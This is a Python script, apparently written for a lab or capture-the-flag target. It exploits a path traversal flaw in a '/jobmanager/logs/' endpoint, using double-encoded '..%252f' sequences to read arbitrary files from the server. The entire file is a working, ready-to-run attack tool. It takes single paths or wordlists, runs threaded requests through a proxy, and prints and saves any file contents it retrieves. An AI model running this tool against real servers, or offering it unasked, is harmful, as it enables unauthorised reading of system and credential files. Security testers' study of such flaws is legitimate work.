import requests
import argparse
import os
import concurrent.futures
import threading
from pwn import log  # Import pwntools to display information and progress

class LogTraversal:
    def __init__(self, target, depth, file_path=None, file_list_path=None, threads=1, save=False, proxy="127.0.0.1:8080"):
        """
        Initialize the class with the target URL, traversal depth, file path,
        file list path, number of threads, option to save valid responses, and proxy to use.
        :param target: Target URL (e.g., "http://10.10.110.78:8081/")
        :param depth: Traversal depth (an integer)
        :param file_path: Individual file path to request.
        :param file_list_path: Path to a file that contains multiple paths, one per line.
        :param threads: Number of threads to use for making requests.
        :param save: Boolean indicating whether to save valid responses in files.
        :param proxy: Proxy to use in the format "IP:port". To disable, pass "none".
        """
        self.target = target.rstrip('/')
        self.depth = depth
        self.file_path = file_path
        self.file_list_path = file_list_path
        self.threads = threads
        self.save = save
        self.proxy = proxy
        
        # For tracking progress and results
        self.lock = threading.Lock()
        self.counter = 0
        self.total_requests = 0
        self.results = []  # Stores tuples (path, response)

    def build_url(self, filepath):
        """
        Build the URL using the directory traversal technique.
        :param filepath: File path to include in the URL.
        :return: Final URL to make the request.
        """
        traversal = "..%252f" * self.depth
        # Replace slashes (/) with their encoded representation for traversal
        filename = filepath.replace("/", "%252f")
        url = f"{self.target}/jobmanager/logs/{traversal}{filename}"
        return url

    def send_request(self, filepath):
        """
        Send the HTTP request to the constructed URL for the given file.
        Updates the progress and stores the response if it is valid.
        :param filepath: File path to request.
        """
        url = self.build_url(filepath)
        # Proxy configuration
        if self.proxy and self.proxy.lower() != "none":
            proxies = {"http": f"http://{self.proxy}", "https": f"http://{self.proxy}"}
        else:
            proxies = None

        try:
            response = requests.get(url, proxies=proxies)
            with self.lock:
                self.counter += 1
                self.progress.status(f"{self.counter} / {self.total_requests}")
            if response.ok:
                with self.lock:
                    self.results.append((filepath, response.text))
                log.info(f"Valid response for: {filepath}")
        except Exception as e:
            with self.lock:
                self.counter += 1
                self.progress.status(f"{self.counter} / {self.total_requests}")
            # Errors are ignored to avoid showing invalid information
            pass

    def save_results(self):
        """
        Save the valid responses in individual files within a folder created at runtime.
        """
        folder_name = "payloads_saved"
        os.makedirs(folder_name, exist_ok=True)
        for filepath, content in self.results:
            # Sanitize the file name
            filename = filepath.replace("/", "_").strip("_")
            if not filename:
                filename = "root"
            file_full_path = os.path.join(folder_name, f"{filename}.txt")
            with open(file_full_path, 'w', encoding='utf-8') as f:
                f.write(content)
        log.info(f"{len(self.results)} files have been saved in the folder '{folder_name}'.")

    def run(self):
        """
        Execute the process depending on whether an individual file path or a file containing multiple paths is provided.
        Uses multiple threads if specified and displays real-time progress.
        """
        paths = []
        if self.file_path:
            paths = [self.file_path]
        elif self.file_list_path:
            if os.path.exists(self.file_list_path):
                with open(self.file_list_path, 'r') as f:
                    paths = [line.strip() for line in f if line.strip()]
            else:
                log.error("The file list does not exist.")
                return
        else:
            log.error("No file path was provided.")
            return
        
        self.total_requests = len(paths)
        self.progress = log.progress("Requests")
        self.progress.status(f"0 / {self.total_requests}")

        if self.threads > 1:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                executor.map(self.send_request, paths)
        else:
            for path in paths:
                self.send_request(path)

        self.progress.success(f"Completed: {self.total_requests} requests made.")

        # Display valid responses on screen
        if self.results:
            log.info("Valid responses obtained:")
            for filepath, content in self.results:
                log.info(f"--- {filepath} ---")
                print(content)
                print("-" * 50)
        else:
            log.info("No valid responses were obtained.")

        # Save results if the option is enabled
        if self.save and self.results:
            self.save_results()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="OOP Log Traversal script using pwntools to display progress, use a proxy, and save results"
    )
    parser.add_argument("--target", help="Target URL, e.g., 'http://10.10.110.78:8081/'", required=True)
    parser.add_argument("--depth", help="Traversal depth (default=12)", type=int, default=12)
    
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--file-path", help="Individual file path to request", dest="file_path")
    group.add_argument("--file-list", help="File that contains multiple paths", dest="file_list_path")
    
    parser.add_argument("--threads", help="Number of threads to use for requests (default=1)", type=int, default=1)
    parser.add_argument("--save", help="Save valid responses into files in a folder", action="store_true")
    parser.add_argument("--proxy", help="Proxy to use (e.g., '127.0.0.1:8080'). To disable, use 'none'. Default is 127.0.0.1:8080", default="127.0.0.1:8080")
    
    args = parser.parse_args()
    
    log_traversal = LogTraversal(
        target=args.target,
        depth=args.depth,
        file_path=args.file_path,
        file_list_path=args.file_list_path,
        threads=args.threads,
        save=args.save,
        proxy=args.proxy
    )
    log_traversal.run()